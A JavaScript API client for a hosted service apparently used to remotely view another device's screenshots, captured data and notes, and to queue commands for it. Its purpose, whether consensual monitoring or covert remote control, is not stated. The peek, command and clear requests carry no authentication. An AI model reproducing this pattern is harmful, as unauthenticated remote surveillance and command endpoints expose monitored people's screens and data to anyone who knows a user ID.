const API_BASE = "https://sensus-api-wd2o.onrender.com";

async function handleResponse(res) {
  if (!res.ok) {
    const text = await res.text();
    let message = text;
    try {
      const data = JSON.parse(text);
      message = data.detail || data.message || text;
    } catch (_e) {}
    throw new Error(message || `Request failed with status ${res.status}`);
  }
  if (res.status === 204) return null;
  const ct = res.headers.get("content-type") || "";
  if (ct.includes("application/json")) {
    return res.json();
  }
  return res.blob();
}

export async function loginRequest(userId, password) {
  const res = await fetch(`${API_BASE}/auth/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ user_id: userId, password })
  });
  return handleResponse(res);
}

export async function changePassword(userId, oldPassword, newPassword) {
  const res = await fetch(`${API_BASE}/user/${encodeURIComponent(userId)}/change_password`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ old_password: oldPassword, new_password: newPassword })
  });
  return handleResponse(res);
}

export async function fetchDataPeek(userId) {
  const res = await fetch(`${API_BASE}/data_peek/${encodeURIComponent(userId)}`);
  return handleResponse(res);
}

export async function clearDataPeek(userId) {
  const res = await fetch(`${API_BASE}/data_peek/${encodeURIComponent(userId)}/clear`, {
    method: "POST"
  });
  return handleResponse(res);
}

export async function fetchNotePeek(userId) {
  const res = await fetch(`${API_BASE}/note_peek/${encodeURIComponent(userId)}`);
  return handleResponse(res);
}

export async function clearNotePeek(userId) {
  const res = await fetch(`${API_BASE}/note_peek/${encodeURIComponent(userId)}/clear`, {
    method: "POST"
  });
  return handleResponse(res);
}

export async function fetchScreenPeek(userId) {
  const res = await fetch(`${API_BASE}/screen_peek/${encodeURIComponent(userId)}`);
  return handleResponse(res);
}

export async function fetchScreenshotBlob(userId) {
  const res = await fetch(`${API_BASE}/screen_peek/${encodeURIComponent(userId)}/screenshot?${Date.now()}`);
  if (!res.ok) return null;
  return res.blob();
}

export async function clearScreenPeek(userId) {
  const res = await fetch(`${API_BASE}/screen_peek/${encodeURIComponent(userId)}/clear`, {
    method: "POST"
  });
  return handleResponse(res);
}

export async function fetchCommands(userId) {
  const res = await fetch(`${API_BASE}/commands/${encodeURIComponent(userId)}`);
  return handleResponse(res);
}

export async function setCommand(userId, command) {
  const res = await fetch(`${API_BASE}/commands/${encodeURIComponent(userId)}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ command })
  });
  return handleResponse(res);
}

export async function clearAll(userId) {
  const res = await fetch(`${API_BASE}/clear_all/${encodeURIComponent(userId)}`, {
    method: "POST"
  });
  return handleResponse(res);
}
